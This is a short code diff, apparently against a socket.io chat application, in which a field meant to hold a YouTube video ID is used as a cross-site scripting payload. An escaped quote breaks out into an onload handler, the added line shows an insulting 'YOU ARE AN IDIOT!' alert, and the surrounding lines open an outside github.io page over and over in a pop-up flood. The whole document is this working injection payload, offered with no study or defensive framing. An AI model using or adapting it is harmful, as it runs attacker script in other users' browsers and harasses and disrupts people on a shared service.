@@ -2,6 +2,7 @@ socket.emit('command', {
   list: [
     "youtube",
     "FveF-we6lcE\" onload=\" \
+      alert('YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT! YOU ARE AN IDIOT!'); \
       window.open('https://tlrenny25.github.io'); \
       window.open('https://tlrenny25.github.io'); \
       window.open('https://tlrenny25.github.io'); \
